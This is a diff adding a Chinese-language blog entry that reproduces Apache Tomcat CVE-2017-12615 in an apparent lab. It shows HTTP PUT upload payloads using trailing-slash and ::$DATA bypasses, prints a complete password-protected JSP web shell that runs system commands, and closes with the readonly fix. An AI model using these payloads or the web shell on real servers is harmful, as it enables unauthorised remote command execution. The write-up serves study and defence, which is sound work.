@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>tomcat CVE-2017-12615</title>
+      <link href="/2019/07/29/tomcat-cve-2017-12615/"/>
+      <url>/2019/07/29/tomcat-cve-2017-12615/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2017-12615属于文件上传漏洞，当tomcat运行在windows主机上，且启用了http put请求方法（将readonly初始化参数设置为false），攻击者将有可能通过精心构造的攻击请求向服务器上传包含恶意代码的jsp文件，之后jsp代码将有可能被服务器执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>Apache Tomcat 7.0.0-7.0.81</code></pre><h2 id="原理讲解"><a href="#原理讲解" class="headerlink" title="原理讲解"></a>原理讲解</h2><p>因为在<strong>Tomcat 7.0/conf/web.xml</strong>里面有对readonly的设置，如果是false的话，我们就可以通过抓包改包的方式去修改请求的方式为PUT来上传文件。</p><h2 id="上传姿势"><a href="#上传姿势" class="headerlink" title="上传姿势"></a>上传姿势</h2><p>因为在服务器端有对jsp的相应过滤，所以我们直接上传jsp的话，服务器是不会解析的，会返回状态码400（bad request），所以要有一定的绕过方法。</p><h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3><p>使用服务器对其处理过程的文件名的识别存在差异，通过上传test.jsp/识别为非jsp文件，而去保存文件<br>payload如下</p><pre><code>PUT /222.jsp/ HTTP/1.1Host: 192.168.75.131:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><p><strong>jsp shell</strong></p><pre><code>&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;&#39;&#39;&#39;</code></pre><p>通过burp改包，上传shell<br><img src="/2019/07/29/tomcat-cve-2017-12615/2.PNG" alt=""><br>通过我们写的shell去访问指定的目录<br><img src="/2019/07/29/tomcat-cve-2017-12615/3.PNG" alt=""><br>成功getshell</p><h3 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h3><p>通过windows的NTFS的相关设置而研究出的一种绕过姿势</p><pre><code>All files on an NTFS volume consist of at least one stream - the main stream – this is the normal, viewable file in which data is stored. The full name of a stream is of the form below.&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;The default data stream has no name. That is, the fully qualified name for the default stream for a file called &quot;sample.txt&quot; is &quot;sample.txt::$DATA&quot; since &quot;sample.txt&quot; is the name of the file and &quot;$DATA&quot; is the stream type.默认数据流没有名称。也就是说，默认流的完全限定名名为“sample.txt”的文件是“sample.txt:：$data”，因为“sample.txt”是文件名和“$data”是流类型。</code></pre><p>所以构造payload</p><pre><code>PUT /111.jsp::$DATA HTTP/1.1Host: 192.168.75.131:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><p>通过burp的一顿操作<br><img src="/2019/07/29/tomcat-cve-2017-12615/1.PNG" alt=""><br>返回状态码201表示已创建<br>但是这种方法虽然能上传上去，但是服务器并不解析<br><img src="/2019/07/29/tomcat-cve-2017-12615/4.PNG" alt=""><br>还没找到原因，之后找到原因后再更新。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>因为<strong>/</strong>的特性，文件上传的漏洞影响的版本比较多，从5.x-9.x无不中枪。此漏洞最好的防御措施就是conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，才能防止漏洞。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre><code>https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>weblogic XMLDecoder反序列化漏洞复现</title>
       <link href="/2019/07/26/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-fu-xian/"/>
       <url>/2019/07/26/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-fu-xian/</url>
